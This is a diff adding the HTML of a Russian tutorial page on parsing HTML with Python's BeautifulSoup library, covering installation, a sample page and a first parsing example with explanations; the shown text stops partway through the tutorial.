@@ -1,0 +1,1602 @@
+<!doctype html>
+<html lang="ru-RU">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	
+	<!-- This site is optimized with the Yoast SEO plugin v18.1 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Пример парсинга HTML сайта с BeautifulSoup в Python</title>
+	<meta name="description" content="Пример парсинга HTML сайта с BeautifulSoup в Python. Работа с веб-страницами не ограничивается одним лишь их созданием или открытием. Например, может понадобиться открыть на них какую-то информацию. Сегодня поговорим о том, как использовать библиотеку BeautifulSoup Python. В частности, разберемся, как с ее помощью использовать те или иные теги, модифицировать документы, осуществлять перебор его элементов, а также как выполнять парсинг веб-страниц." />
+	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html" />
+	<meta property="og:locale" content="ru_RU" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Пример парсинга HTML сайта с BeautifulSoup в Python" />
+	<meta property="og:description" content="Пример парсинга HTML сайта с BeautifulSoup в Python. Работа с веб-страницами не ограничивается одним лишь их созданием или открытием. Например, может понадобиться открыть на них какую-то информацию. Сегодня поговорим о том, как использовать библиотеку BeautifulSoup Python. В частности, разберемся, как с ее помощью использовать те или иные теги, модифицировать документы, осуществлять перебор его элементов, а также как выполнять парсинг веб-страниц." />
+	<meta property="og:url" content="https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html" />
+	<meta property="og:site_name" content="ОфисГуру" />
+	<meta property="article:published_time" content="2022-01-11T11:28:57+00:00" />
+	<meta property="og:image" content="https://office-guru.ru/wp-content/uploads/2022/01/e453ad80-abde-11ea-93df-fe0442095c6d.jpeg" />
+	<meta property="og:image:width" content="1500" />
+	<meta property="og:image:height" content="864" />
+	<meta property="og:image:type" content="image/jpeg" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://office-guru.ru/#website","url":"https://office-guru.ru/","name":"ОфисГуру","description":"Журнал новых технологий","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://office-guru.ru/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"ru-RU"},{"@type":"ImageObject","@id":"https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html#primaryimage","inLanguage":"ru-RU","url":"https://office-guru.ru/wp-content/uploads/2022/01/e453ad80-abde-11ea-93df-fe0442095c6d.jpeg","contentUrl":"https://office-guru.ru/wp-content/uploads/2022/01/e453ad80-abde-11ea-93df-fe0442095c6d.jpeg","width":1500,"height":864,"caption":"Пример парсинга HTML сайта с BeautifulSoup в Python"},{"@type":"WebPage","@id":"https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html#webpage","url":"https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html","name":"Пример парсинга HTML сайта с BeautifulSoup в Python","isPartOf":{"@id":"https://office-guru.ru/#website"},"primaryImageOfPage":{"@id":"https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html#primaryimage"},"datePublished":"2022-01-11T11:28:57+00:00","dateModified":"2022-01-11T11:28:57+00:00","author":{"@id":"https://office-guru.ru/#/schema/person/e6c341f798c7bc7d890a4a5d4249d581"},"description":"Пример парсинга HTML сайта с BeautifulSoup в Python. Работа с веб-страницами не ограничивается одним лишь их созданием или открытием. Например, может понадобиться открыть на них какую-то информацию. Сегодня поговорим о том, как использовать библиотеку BeautifulSoup Python. В частности, разберемся, как с ее помощью использовать те или иные теги, модифицировать документы, осуществлять перебор его элементов, а также как выполнять парсинг веб-страниц.","breadcrumb":{"@id":"https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html#breadcrumb"},"inLanguage":"ru-RU","potentialAction":[{"@type":"ReadAction","target":["https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html"]}]},{"@type":"BreadcrumbList","@id":"https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Главная страница","item":"https://office-guru.ru/"},{"@type":"ListItem","position":2,"name":"BeautifulSoup – парсинг HTML в Python на примерах"}]},{"@type":"Person","@id":"https://office-guru.ru/#/schema/person/e6c341f798c7bc7d890a4a5d4249d581","name":"Амина С.","image":{"@type":"ImageObject","@id":"https://office-guru.ru/#personlogo","inLanguage":"ru-RU","url":"https://secure.gravatar.com/avatar/de0b95d16f16476b1e28a8ed52627284?s=96&d=mm&r=g","contentUrl":"https://secure.gravatar.com/avatar/de0b95d16f16476b1e28a8ed52627284?s=96&d=mm&r=g","caption":"Амина С."},"sameAs":["excelpro"]}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel="alternate" type="application/rss+xml" title="ОфисГуру  &raquo; Лента комментариев к &laquo;BeautifulSoup – парсинг HTML в Python на примерах&raquo;" href="https://office-guru.ru/python-onlajn-kurs/uroki/beautifulsoup-parsing-html-v-python-na-primerax.html/feed" />
+<link rel='stylesheet' id='wp-block-library-css'  href='https://office-guru.ru/wp-includes/css/dist/block-library/style.min.css'  media='all' />
+<link rel='stylesheet' id='wp-block-library-theme-css'  href='https://office-guru.ru/wp-includes/css/dist/block-library/theme.min.css'  media='all' />
+<link rel='stylesheet' id='likebtn_style-css'  href='https://office-guru.ru/wp-content/plugins/likebtn-like-button/public/css/style.css'  media='all' />
+<link rel='stylesheet' id='codemirror-css'  href='https://office-guru.ru/wp-content/plugins/wp-codemirror-block/vendor/codemirror/lib/codemirror.min.css'  media='all' />
+<link rel='stylesheet' id='codemirror-blocks--css'  href='https://office-guru.ru/wp-content/plugins/wp-codemirror-block/assets/blocks/blocks.style.build.min.css'  media='all' />
+<link rel='stylesheet' id='google-fonts-css'  href='https://fonts.googleapis.com/css?family=Montserrat%3A400%2C400i%2C700&#038;subset=cyrillic&#038;display=swap'  media='all' />
+<link rel='stylesheet' id='reboot-style-css'  href='https://office-guru.ru/wp-content/themes/reboot/assets/css/style.min.css'  media='all' />
+<script type='text/javascript' id='likebtn_frontend-js-extra'>
+/* <![CDATA[ */
+var likebtn_eh_data = {"ajaxurl":"https:\/\/office-guru.ru\/wp-admin\/admin-ajax.php","security":"89b9abf763"};
+/* ]]> */
+</script>
+<script  src='https://office-guru.ru/wp-content/plugins/likebtn-like-button/public/js/frontend.js' id='likebtn_frontend-js'></script>
+<script  src='https://office-guru.ru/wp-includes/js/jquery/jquery.min.js' id='jquery-core-js'></script>
+<script  src='https://office-guru.ru/wp-includes/js/jquery/jquery-migrate.min.js' id='jquery-migrate-js'></script>
+<style>.pseudo-clearfy-link { color: #008acf; cursor: pointer;}.pseudo-clearfy-link:hover { text-decoration: none;}</style><!-- Yandex.RTB -->
+<script>window.yaContextCb=window.yaContextCb||[]</script>
+<script src="https://yandex.ru/ads/system/context.js" async></script>
+
+
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8899750987778182"
+     crossorigin="anonymous"></script>
+
+<!-- adfinity 
+<link rel="stylesheet" href="https://cdn.adfinity.pro/foralls/adfinity_1.1.css">
+<script src="https://yandex.ru/ads/system/header-bidding.js"></script>
+<script src="https://cdn.adfinity.pro/foralls/adfinity_1.1.js"></script>
+<script src="https://cdn.adfinity.pro/partners/office-guru.ru/hbconfig.js"></script>
+<script>window.yaContextCb = window.yaContextCb || []</script>
+<script src="https://yandex.ru/ads/system/context.js" async></script>
+<link rel="preconnect" href="https://ads.betweendigital.com" crossorigin>
+ adfinity -->
+
+
+<meta name="yandex-verification" content="67339c781e8485ef" />
+<meta name="pmail-verification" content="11d884e12720872542c761bdc80f4981">
+
+
+  
+ <!-- optad360
+<script async src="//cmp.optad360.io/items/64114588-667d-4abb-9cf0-1c575b21d705.min.js"></script>
+<script async src="//get.optad360.io/sf/86314e2d-6eff-47fc-ba39-cc8adf4bff3d/plugin.min.js"></script>
+  optad360-->
+
+<!-- ads google-->
+<script data-ad-client="ca-pub-1422321346882546" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- ads google-->
+  
+  <!-- slickjump
+  <script async type="text/javascript" src="//sjsmartcontent.org/static/plugin-site/js/sjplugin.js" data-site="6jyi"></script>
+   slickjump-->
+  
+  <!-- newshunter
+  <script
+id="delivery-draw-kit"
+  src="https://cdn.hunterdelivery.com/scripts/draw_script.js"
+  onload="javascript:renderDelivery('5f89efe86f72c')"
+  async defer>
+</script>
+   newshunter-->
+  
+
+
+ 
+
+<!-- 
+<link rel="preload" as="script" href="https://nativerent.ru/js/codes/nativerent.v2.js" crossorigin>
+<script src="https://nativerent.ru/js/codes/nativerent.v2.js" async crossorigin></script>
+<script type="text/javascript">
+    (function () {
+        (window.NRentCounter = window.NRentCounter || []).push({
+            id: "5e465c392532f"
+        });
+    }());
+</script>
+-->
+
+
+<!-- Yandex.Metrika counter -->
+<script type="text/javascript" >
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(26013990, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true
+   });
+</script>
+<noscript><div><img src="https://mc.yandex.ru/watch/26013990" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+<!-- /Yandex.Metrika counter -->
+
+
+<!--LiveInternet counter--><script>
+new Image().src = "https://counter.yadro.ru/hit?r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";h"+escape(document.title.substring(0,150))+
+";"+Math.random();</script><!--/LiveInternet-->
+
+<link rel="preload" href="https://office-guru.ru/wp-content/themes/reboot/assets/fonts/wpshop-core.ttf" as="font" crossorigin><link rel="preload" href="https://office-guru.ru/wp-content/uploads/2022/01/e453ad80-abde-11ea-93df-fe0442095c6d.jpeg" as="image" crossorigin>
+    <style>.post-card--grid, .post-card--grid .post-card__thumbnail, .post-card--grid .post-card__thumbnail img, .post-card--grid .post-card__thumbnail:before{border-radius: 6px}.post-card--related, .post-card--related .post-card__thumbnail img, .post-card--related .post-card__thumbnail a:before{border-radius: 6px}</style>
+<link rel="icon" href="https://office-guru.ru/wp-content/uploads/2021/08/1936905_computer_device_mac_pc_work_icon.ico" sizes="32x32" />
+<link rel="icon" href="https://office-guru.ru/wp-content/uploads/2021/08/1936905_computer_device_mac_pc_work_icon.ico" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://office-guru.ru/wp-content/uploads/2021/08/1936905_computer_device_mac_pc_work_icon.ico" />
+<meta name="msapplication-TileImage" content="https://office-guru.ru/wp-content/uploads/2021/08/1936905_computer_device_mac_pc_work_icon.ico" />
+<style>
+.ai-viewports                 {--ai: 1;}
+.ai-viewport-3                { display: none !important;}
+.ai-viewport-2                { display: none !important;}
+.ai-viewport-1                { display: inherit !important;}
+.ai-viewport-0                { display: none !important;}
+@media (min-width: 768px) and (max-width: 979px) {
+.ai-viewport-1                { display: none !important;}
+.ai-viewport-2                { display: inherit !important;}
+}
+@media (max-width: 767px) {
+.ai-viewport-1                { display: none !important;}
+.ai-viewport-3                { display: inherit !important;}
+}
+</style>
+<script>var ajaxUrlFlatPM = "https://office-guru.ru/wp-admin/admin-ajax.php", untilscrollFlatPM = ".flat_pm_end"</script>    </head>
+
+<body data-rsssl=1 class="post-template-default single single-post postid-23642 single-format-standard wp-embed-responsive sidebar-right">
+
+
+
+<div id="page" class="site">
+    <a class="skip-link screen-reader-text" href="#content">Перейти к содержанию</a>
+
+    <div class="search-screen-overlay js-search-screen-overlay"></div>
+    <div class="search-screen js-search-screen">
+        
+<form role="search" method="get" class="search-form" action="https://office-guru.ru/">
+    <label>
+        <span class="screen-reader-text">Search for:</span>
+        <input type="search" class="search-field" placeholder="Поиск…" value="" name="s">
+    </label>
+    <button type="submit" class="search-submit"></button>
+</form>    </div>
+
+    
+
+<header id="masthead" class="site-header full" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="site-header-inner fixed">
+
+        <div class="humburger js-humburger"><span></span><span></span><span></span></div>
+
+        
+<div class="site-branding">
+
+    <div class="site-logotype"><a href="https://office-guru.ru/"><img src="https://office-guru.ru/wp-content/uploads/2021/08/1936905_computer_device_mac_pc_work_icon-1.png" width="64" height="64" alt="ОфисГуру "></a></div><div class="site-branding__body"><div class="site-title"><a href="https://office-guru.ru/">ОфисГуру </a></div><p class="site-description">Журнал новых технологий</p></div></div><!-- .site-branding -->                <div class="header-search">
+                    <span class="search-icon js-search-icon"></span>
+                </div>
+            
+    </div>
+</header><!-- #masthead -->
+
+
+    
+    
+    <nav id="site-navigation" class="main-navigation fixed" itemscope itemtype="http://schema.org/SiteNavigationElement">
+        <div class="main-navigation-inner full">
+            <div class="menu-novostnoe-menyu-container"><ul id="header_menu" class="menu"><li id="menu-item-16201" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16201"><a href="https://office-guru.ru/news">Новости</a></li>
+<li id="menu-item-16202" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-16202"><a href="https://office-guru.ru/analitika">Аналитика</a></li>
+<li id="menu-item-16210" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-16210"><a href="https://office-guru.ru/excel/samouchitel-excel-dlja-chainikov-1.html">Спецпроекты</a></li>
+<li id="menu-item-26950" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26950"><a href="https://office-guru.ru/kontakty-redakcii-zhurnala-ofisguru">Контакты редакции</a></li>
+</ul></div>        </div>
+    </nav><!-- #site-navigation -->
+
+    
+
+    <div class="mobile-menu-placeholder js-mobile-menu-placeholder"></div>
+    
+	
+    <div id="content" class="site-content fixed">
+
+        
+        <div class="site-content-inner">
+    
+        
+        <div id="primary" class="content-area" itemscope itemtype="http://schema.org/Article">
+            <main id="main" class="site-main article-card">
+
+                
+<article id="post-23642" class="article-post post-23642 post type-post status-publish format-standard has-post-thumbnail  category-uroki">
+
+    
+        <div class="breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList"><span class="breadcrumb-item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="https://office-guru.ru/" itemprop="item"><span itemprop="name">Главная</span></a><meta itemprop="position" content="0"></span> <span class="breadcrumb-separator">»</span> <span class="breadcrumb-item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="https://office-guru.ru/python-onlajn-kurs" itemprop="item"><span itemprop="name">Python онлайн-курс</span></a><meta itemprop="position" content="1"></span> <span class="breadcrumb-separator">»</span> <span class="breadcrumb-item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="https://office-guru.ru/python-onlajn-kurs/uroki" itemprop="item"><span itemprop="name">Уроки</span></a><meta itemprop="position" content="2"></span></div>
+                                <h1 class="entry-title" itemprop="headline">BeautifulSoup – парсинг HTML в Python на примерах</h1>
+                    
+        
+        
+    
+            <div class="entry-meta">
+            <span class="entry-author" itemprop="author"><span class="entry-label">Автор</span> Амина С.</span>            <span class="entry-time"><span class="entry-label">На чтение</span> 16 мин</span>                        <span class="entry-date"><span class="entry-label">Опубликовано</span> <time itemprop="datePublished" datetime="2022-01-11">11.01.2022</time></span>
+                    </div>
+    
+    
+    <div class="entry-content" itemprop="articleBody">
+        <div class='code-block code-block-4' style='margin: 8px 0; clear: both;'>
+<div class="su-spoiler su-spoiler-style-default su-spoiler-icon-plus su-spoiler-closed" data-scroll-offset="0" data-anchor-in-url="no"><div class="su-spoiler-title" tabindex="0" role="button"><span class="su-spoiler-icon"></span></div><div class="su-spoiler-content su-u-clearfix su-u-trim">
+<!-- BEGIN Otclick Banner office-guru 300x250 (banner) CPM-->
+<div id="_mt_ot_container_5116"></div>
+<script language="JavaScript">
+<!--
+(function(w){
+var wd = w.document;
+w._mt_rnd = w._mt_rnd || Math.floor(Math.random() * 1000000);
+w._mt_referrer = w._mt_referrer || escape(wd.referrer || '');
+try { w._mt_location = w._mt_location || escape(w.top.location.href) }
+catch (e) { w._mt_location = escape(w.location.href) }
+w._MT_jsLoadDelayed = function(b,c,d){var a=wd.createElement("script");
+d&&(a.id=d);a.language="javascript";a.type="text/javascript";a.charset="utf-8";a.async=1;
+a.src=b;if(w.ActiveXObject){var e=!1;a.onload=a.onreadystatechange=function(){
+if(!e&&(!this.readyState||this.readyState==="complete"||this.readyState==="loaded"&&
+this.nextSibling!=null)){e=true;c&&c();a.onload=a.onreadystatechange=null}}}else
+a.onload=c;b=wd.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)};
+w._MT_jsLoadDelayed('//otclick-adv.ru/core/code.js?pid=5116&rid=' + w._mt_rnd + '&rl=' +
+w._mt_referrer + '&ll=' + w._mt_location + '&ow=' + w.outerWidth + '&oh=' + w.outerHeight +
+'&sw=' + w.screen.width + '&sh=' + w.screen.height + '&pd=' + w.screen.pixelDepth + '&f=' +
+(w.top == w ? 0 : 1));
+})(window)
+// -->
+</script>
+<!-- END Otclick Banner -->
+
+<!-- BEGIN Otclick Banner office-guru 728x90 (banner) CPM-->
+<div id="_mt_ot_container_5112"></div>
+<script language="JavaScript">
+<!--
+(function(w){
+var wd = w.document;
+w._mt_rnd = w._mt_rnd || Math.floor(Math.random() * 1000000);
+w._mt_referrer = w._mt_referrer || escape(wd.referrer || '');
+try { w._mt_location = w._mt_location || escape(w.top.location.href) }
+catch (e) { w._mt_location = escape(w.location.href) }
+w._MT_jsLoadDelayed = function(b,c,d){var a=wd.createElement("script");
+d&&(a.id=d);a.language="javascript";a.type="text/javascript";a.charset="utf-8";a.async=1;
+a.src=b;if(w.ActiveXObject){var e=!1;a.onload=a.onreadystatechange=function(){
+if(!e&&(!this.readyState||this.readyState==="complete"||this.readyState==="loaded"&&
+this.nextSibling!=null)){e=true;c&&c();a.onload=a.onreadystatechange=null}}}else
+a.onload=c;b=wd.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)};
+w._MT_jsLoadDelayed('//otclick-adv.ru/core/code.js?pid=5112&rid=' + w._mt_rnd + '&rl=' +
+w._mt_referrer + '&ll=' + w._mt_location + '&ow=' + w.outerWidth + '&oh=' + w.outerHeight +
+'&sw=' + w.screen.width + '&sh=' + w.screen.height + '&pd=' + w.screen.pixelDepth + '&f=' +
+(w.top == w ? 0 : 1));
+})(window)
+// -->
+</script>
+
+<!-- END Otclick Banner -->
+
+<!-- BEGIN Otclick Banner office-guru 240x400 (banner) CPM-->
+<div id="_mt_ot_container_5111"></div>
+<script language="JavaScript">
+<!--
+(function(w){
+var wd = w.document;
+w._mt_rnd = w._mt_rnd || Math.floor(Math.random() * 1000000);
+w._mt_referrer = w._mt_referrer || escape(wd.referrer || '');
+try { w._mt_location = w._mt_location || escape(w.top.location.href) }
+catch (e) { w._mt_location = escape(w.location.href) }
+w._MT_jsLoadDelayed = function(b,c,d){var a=wd.createElement("script");
+d&&(a.id=d);a.language="javascript";a.type="text/javascript";a.charset="utf-8";a.async=1;
+a.src=b;if(w.ActiveXObject){var e=!1;a.onload=a.onreadystatechange=function(){
+if(!e&&(!this.readyState||this.readyState==="complete"||this.readyState==="loaded"&&
+this.nextSibling!=null)){e=true;c&&c();a.onload=a.onreadystatechange=null}}}else
+a.onload=c;b=wd.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b)};
+w._MT_jsLoadDelayed('//otclick-adv.ru/core/code.js?pid=5111&rid=' + w._mt_rnd + '&rl=' +
+w._mt_referrer + '&ll=' + w._mt_location + '&ow=' + w.outerWidth + '&oh=' + w.outerHeight +
+'&sw=' + w.screen.width + '&sh=' + w.screen.height + '&pd=' + w.screen.pixelDepth + '&f=' +
+(w.top == w ? 0 : 1));
+})(window)
+// -->
+</script>
+<!-- END Otclick Banner -->
+
+
+
+</div></div></div>
+<div class="flat_pm_start"></div>
+<p><span style="font-weight: 400;">Работа с веб-страницами не ограничивается одним лишь их созданием или открытием. Например, может понадобиться открыть на них какую-то информацию. Сегодня поговорим о том, как использовать библиотеку BeautifulSoup Python. В частности, разберемся, как с ее помощью использовать те или иные теги, модифицировать документы, осуществлять перебор его элементов, а также как выполнять парсинг веб-страниц.</span><span id="more-23642"></span></p>
+<div class="table-of-contents open"><div class="table-of-contents__header"><span class="table-of-contents__hide js-table-of-contents-hide">Содержание</span></div><ol class="table-of-contents__list js-table-of-contents-list">
+<li class="level-1"><a href="#primery-beautifulsoup">Примеры BeautifulSoup</a></li><li class="level-1"><a href="#kak-ustanovit-beautifulsoup-v-python">Как установить BeautifulSoup в Python</a></li><li class="level-1"><a href="#primer-koda-html-stranitsy">Пример кода HTML-страницы</a></li><li class="level-1"><a href="#prostoy-primer-parsinga-html-s-ispolzovaniem">Простой пример парсинга HTML с использованием BeautifulSoup</a></li><li class="level-1"><a href="#tegi-atributy-namei-text">Теги, атрибуты nameи text</a></li><li class="level-1"><a href="#beautifulsoup-perebor-tegov-html">BeautifulSoup – перебор тегов HTML</a></li><li class="level-1"><a href="#beautifulsoup-ispolzovanie-atributa-children">BeautifulSoup – использование атрибута children</a></li><li class="level-1"><a href="#atribut-descendants">Атрибут descendants</a></li><li class="level-1"><a href="#beautifulsoup-i-veb-skraping-html">BeautifulSoup и веб-скрапинг HTML</a></li><li class="level-1"><a href="#metod-prettify">Метод prettify()</a></li><li class="level-1"><a href="#metod-find-poisk-elementov-po-aydi">Метод find(), поиск элементов по айди</a></li><li class="level-1"><a href="#poisk-vseh-tegov">Поиск всех тегов</a></li><li class="level-1"><a href="#ispolzovanie-metodov-select-i-select_one">Использование методов select()и select_one()</a></li><li class="level-1"><a href="#beautifulsoup-ispolzovanie-metoda-append">BeautifulSoup – использование метода append()</a></li><li class="level-1"><a href="#metod-insert-vstavka-html-tega">Метод insert()  – вставка HTML-тега</a></li><li class="level-1"><a href="#ispolzovanie-metoda-replace_with-dlya-zameny">Использование метода replace_with()для замены текста в теге</a></li><li class="level-1"><a href="#ispolzovanie-metoda-decompose-dlya-udaleniya">Использование метода decompose()для удаления HTML-тега</a></li></ol></div><h2 id="primery-beautifulsoup"><span style="font-weight: 400;">Примеры BeautifulSoup</span></h2>
+<p><span style="font-weight: 400;">BeautifulSoup – это библиотека, с помощью которой можно выполнять парсинг HTML и XML документов. Нередко используется для скрапинга веб-страниц. С помощью этой библиотеки можно превратить большой документ HTML-формата в разветвленное дерево разнообразных объектов Python – тегов, навигации или комментариев.</span></p>
+<h2 id="kak-ustanovit-beautifulsoup-v-python"><span style="font-weight: 400;">Как установить BeautifulSoup в Python</span></h2>
+<p><span style="font-weight: 400;">Чтобы установить подходящие модули, необходимо воспользоваться командой </span><i><span style="font-weight: 400;">pip3</span></i><span style="font-weight: 400;">. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ sudo pip3 install lxml</pre>
+</div>
+<p><span style="font-weight: 400;">Сперва понадобится выполнить инсталляцию </span><i><span style="font-weight: 400;">lxml </span></i><span style="font-weight: 400;">модуля, который будет использоваться в BeautifulSoup. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">$ sudo pip3 install bs4</pre>
+</div>
+<p><span style="font-weight: 400;">Собственно, эта команда и используется для установки пакета.</span></p>
+<h2 id="primer-koda-html-stranitsy"><span style="font-weight: 400;">Пример кода HTML-страницы</span></h2>
+<p><span style="font-weight: 400;">Дальше мы будем работать со следующим документом. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">&lt;!DOCTYPE html&gt;
+
+&lt;html&gt;
+
+    &lt;head&gt;
+
+        &lt;title&gt;Header&lt;/title&gt;
+
+        &lt;meta charset="utf-8"&gt;                   
+
+    &lt;/head&gt;
+
+        
+
+    &lt;body&gt;
+
+        &lt;h2&gt;Operating systems&lt;/h2&gt;
+
+        
+
+        &lt;ul id="mylist" style="width:150px"&gt;
+
+            &lt;li&gt;Solaris&lt;/li&gt;
+
+            &lt;li&gt;FreeBSD&lt;/li&gt;
+
+            &lt;li&gt;Debian&lt;/li&gt;                      
+
+            &lt;li&gt;NetBSD&lt;/li&gt;           
+
+            &lt;li&gt;Windows&lt;/li&gt;         
+
+        &lt;/ul&gt;
+
+        
+
+        &lt;p&gt;
+
+          FreeBSD is an advanced computer operating system used to 
+
+          power modern servers, desktops, and embedded platforms.
+
+        &lt;/p&gt;
+
+                
+
+        &lt;p&gt;
+
+          Debian is a Unix-like computer operating system that is 
+
+          composed entirely of free software.
+
+        &lt;/p&gt;        
+
+        
+
+    &lt;/body&gt;    
+
+&lt;/html&gt;</pre>
+</div>
+<h2 id="prostoy-primer-parsinga-html-s-ispolzovaniem"><span style="font-weight: 400;">Простой пример парсинга HTML с использованием BeautifulSoup</span></h2>
+<p><span style="font-weight: 400;">В первом примере будет применяться BeautifulSoup модуль для получения трех тегов. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">#!/usr/bin/python3
+
+
+
+
+from bs4 import BeautifulSoup
+
+
+
+
+with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()
+
+
+
+
+    soup = BeautifulSoup(contents, 'lxml')
+
+
+
+
+    print(soup.h2)
+
+    print(soup.head)
+
+    print(soup.li)</pre>
+</div>
+<p><span style="font-weight: 400;">С помощью приведенного в этом примере кода можно вывести HTML-код трех тегов. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">from bs4 import BeautifulSoup</pre>
+</div>
+<p><span style="font-weight: 400;">А здесь мы импортировали класс </span><i><span style="font-weight: 400;">BeautifulSoup</span></i><span style="font-weight: 400;"> из модуля </span><i><span style="font-weight: 400;">bs4</span></i><span style="font-weight: 400;">. Следовательно, </span><i><span style="font-weight: 400;">BeautifulSoup </span></i><span style="font-weight: 400;">здесь является главным классом. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">with open("index.html", "r") as f:
+
+    
+
+    contents = f.read()</pre>
+</div>
+<p><span style="font-weight: 400;">Откроется файл </span><i><span style="font-weight: 400;">index.html</span></i><span style="font-weight: 400;">, после чего его содержимое будет прочитано с использованием метода </span><i><span style="font-weight: 400;">read()</span></i><span style="font-weight: 400;">.  </span></p>
+<div class="wp-block-codemirror-blocks code-block">
+<pre class="CodeMirror" data-setting="{&quot;mode&quot;:&quot;python&quot;,&quot;mime&quot;:&quot;text/x-python&quot;,&quot;theme&quot;:&quot;material&quot;,&quot;lineNumbers&quot;:true,&quot;lineWrapping&quot;:true,&quot;styleActiveLine&quot;:true,&quot;readOnly&quot;:true,&quot;align&quot;:&quot;&quot;}">soup = BeautifulSoup(contents, 'lxml')</pre>
+</div>
+<p><span style="font-weight: 400;">Эта строка кода создаст объект </span><i><span style="font-weight: 400;">BeautifulSoup</span></i><span style="font-weight: 400;">. Данные будут переданы конструктору. А с помощью второй опции уточняется объект парсинга. </span></p>
+<div class="wp-block-codemirror-blocks code-block">
